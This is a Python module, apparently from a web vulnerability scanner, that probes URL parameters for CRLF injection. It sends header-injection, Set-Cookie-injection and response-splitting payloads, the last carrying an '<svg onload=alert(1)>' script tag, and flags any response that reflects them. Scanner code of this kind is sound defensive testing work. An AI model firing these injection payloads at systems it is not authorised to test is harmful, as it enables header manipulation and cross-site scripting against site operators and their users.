from __future__ import annotations

from . import params, payloads


def vectors(marker):
    tag = "<svg onload=alert(1)>"
    hname = "x-xpars-" + marker
    cookie = "xpars-" + marker
    return [
        ("crlf-header", "\r\n" + hname + ": 1", hname, None),
        ("crlf-setcookie", "\r\nSet-Cookie: " + cookie + "=1", None, cookie),
        ("crlf-body", "\r\nContent-Type: text/html\r\n\r\n" + marker + tag, None, None),
    ]


def evaluate(context, hdr_name, cookie_name, marker, resp_headers, body):
    hl = {}
    try:
        for k, v in (resp_headers or {}).items():
            hl[k.lower()] = str(v).lower()
    except Exception:
        pass
    if hdr_name is not None:
        if hdr_name.lower() in hl:
            return "header injected: " + hdr_name
        return None
    if cookie_name is not None:
        if cookie_name.lower() in hl.get("set-cookie", ""):
            return "set-cookie injected: " + cookie_name
        return None
    b = body or ""
    if marker in b and "<svg onload=alert(1)>" in b \
            and "content-type: text/html" not in b.lower():
        return "body split reflected marker"
    return None


def scan_crlf(client, url):
    out = []
    for name in params.injectable(url):
        mk = payloads.marker()
        for context, value, hdr_name, cookie_name in vectors(mk):
            try:
                resp = client.get(params.set_param(url, name, value))
            except Exception:
                continue
            try:
                body = resp.text
            except Exception:
                body = ""
            ev = evaluate(context, hdr_name, cookie_name, mk, resp.headers, body)
            if ev:
                out.append({
                    "url": url,
                    "param": name,
                    "method": "CRLF",
                    "context": context,
                    "status": getattr(resp, "status_code", 0),
                    "payload": value.replace("\r", "\\r").replace("\n", "\\n"),
                    "working_payloads": [],
                    "evidence": ev,
                    "severity": "high",
                    "how": "crlf-injection",
                    "verified": False,
                })
                break
    return out
